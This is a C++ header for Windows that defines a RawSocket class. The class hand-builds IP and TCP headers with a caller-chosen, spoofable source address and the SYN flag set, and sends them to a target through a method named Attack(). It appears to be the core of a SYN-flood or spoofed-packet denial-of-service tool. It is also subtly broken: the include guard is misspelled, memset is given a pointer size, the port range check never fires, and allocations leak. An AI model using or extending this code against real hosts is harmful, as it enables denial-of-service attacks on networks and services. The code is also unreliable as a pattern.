#ifndef _SOCKET_H_
#define _SCOKET_H_

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

#define MAXPORT		65535 
#define IP_VERSION_AND_HDRLEN_BIT		0b01000101
#define IP_FRAGMENT_BIT					0b0100000000000000
#define TCP_REGISTER_BIT				0b0000000000000010

typedef struct IPHEADHER {
	unsigned char		ip_VersionAndHdrLen;
	unsigned char		ip_TypeOfServices;
	unsigned short		ip_TotalLen;
	unsigned short		ip_ID;
	unsigned short		ip_Fragment;
	unsigned char		ip_TTL;
	unsigned char		ip_Protocol;
	unsigned short		ip_CheckSum;
	unsigned int		ip_SrcIP;
	unsigned int		IP_DstIP;
}ip_hdr;

typedef struct TCPHEADER {
	unsigned short tcp_SrcPort;
	unsigned short tcp_DstPort;
	unsigned int seqNum;
	unsigned int ackNum;
	unsigned short reg;
	unsigned short winSize;
	unsigned short checkSum;
	unsigned short urgentPtr;
}tcp_hdr;

class RawSocket {
private:
	WSADATA wsaData;
	SOCKET rawSock = INVALID_SOCKET;
	sockaddr_in dstAddr;
	WORD wsaVersion = MAKEWORD(2, 2);
	int optival = 1;
	int payLoad = 512;
	char startBuf[1000],* data;
	ip_hdr* ipHdr;
	tcp_hdr* tcpHdr;

public:
	RawSocket(const char* srcIP , const char* dstIP, const int srcPort, const int dstPort) {

		//tcp, ip 헤더 동적 할당
		ipHdr = new ip_hdr;
		memset(ipHdr, 0, sizeof(ipHdr));
		tcpHdr = new tcp_hdr;
		memset(tcpHdr, 0, sizeof(tcpHdr));

		//Winsock 준비(초기화)
		auto result = WSAStartup(wsaVersion, &wsaData);
		if (result != 0) {
			printf("소켓 준비 실패\n");
			exit(1);
		}

		//소켓 초기화
		rawSock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
		if (rawSock == INVALID_SOCKET) {
			printf("소켓 초기화 실패 \n");
			exit(1);
		}
		
		//RawSocket IP, TCP 헤더 자동생성 방지 옵션 추가
		setsockopt(rawSock, IPPROTO_IP, IP_HDRINCL, (char*)&optival, sizeof(optival));
		
		//Port 번호 범위 체크
		if ((0 > srcPort && MAXPORT < srcPort) || (0 > dstPort && MAXPORT < dstPort)) {
			printf("포트가 범위 안에 들지 않습니다. \n");
			exit(01);
		}

		//목적지 정보 설정
		dstAddr.sin_family = AF_INET;
		inet_pton(AF_INET, dstIP, &dstAddr.sin_addr);
		dstAddr.sin_port = htons(dstPort);

		//IP 헤더 값 설정
		ipHdr = (ip_hdr*)startBuf; //sendto로 데이터를 보내기 위해 버퍼 주소 값으로 설정
		ipHdr->ip_VersionAndHdrLen = IP_VERSION_AND_HDRLEN_BIT;
		ipHdr->ip_TypeOfServices = 0;
		ipHdr->ip_TotalLen = htons(sizeof(ip_hdr) + sizeof(tcp_hdr) + payLoad);
		ipHdr->ip_TTL = 8;
		ipHdr->ip_ID = htons(2);
		ipHdr->ip_Fragment = IP_FRAGMENT_BIT;
		ipHdr->ip_Protocol = IPPROTO_TCP;
		ipHdr->ip_CheckSum = 0;
		//IP 등록
		inet_pton(AF_INET, srcIP, &ipHdr->ip_SrcIP);
		inet_pton(AF_INET, dstIP, &ipHdr->IP_DstIP);
	
		//TC 헤더 값 설정
		tcpHdr = (tcp_hdr*)(startBuf + sizeof(*ipHdr));
		tcpHdr->reg = TCP_REGISTER_BIT;
		tcpHdr->checkSum = 0;
		//TCP 등록
		tcpHdr->tcp_SrcPort = htons(srcPort);
		tcpHdr->tcp_DstPort = htons(dstPort);

		//data 주소 값 입력
		data = startBuf + sizeof(*ipHdr) + sizeof(*tcpHdr);
	};

	void Attack() {
		int size = sizeof(*ipHdr) + sizeof(*tcpHdr) + payLoad;
		auto result = sendto(rawSock, startBuf, size, 0, (sockaddr*)&dstAddr, sizeof(dstAddr));
		
	};
	
	void ShowSocketAddr() {
		printf("ipHdr Address : %x \n", ipHdr);
		printf("tcpHdr Address : %x \n", tcpHdr);
		printf("data Address : %x \n", data);
	};

	void ShowMemberSize() {
		printf("IP_Header Size  : %d \n", sizeof(*ipHdr));
		printf("TCP_Header Size : %d \n", sizeof(*tcpHdr));
	};
};
#endif